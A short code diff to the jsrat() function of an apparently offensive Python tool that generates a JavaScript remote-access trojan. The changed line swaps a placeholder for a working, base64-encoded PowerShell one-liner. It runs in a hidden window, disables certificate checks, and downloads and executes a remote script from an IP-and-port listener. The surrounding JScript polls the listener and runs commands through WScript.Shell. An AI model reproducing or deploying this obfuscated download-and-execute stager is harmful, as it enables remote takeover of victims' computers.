@@ -89,7 +89,7 @@ def jsrat():
                         	try {
 					h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
 					h.Send();
-					c = "Enter metasploit or PowerShell Empire one liner here in the form of cmd /c [powershell oneliner]"
+					c = "cmd /c powershell.exe -nop -w 1 -enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7AAoAaQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANwA6ADQANAA0ADQALwBjAG8AbgB0AGUAbgB0AC8AcwAyAF8AdABlAHMAdABwAHMALgBwAHMAMQAnACkAKQAKAA=="
                             		        r = new ActiveXObject("WScript.Shell").Exec(c);
 				    		var so;
 				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
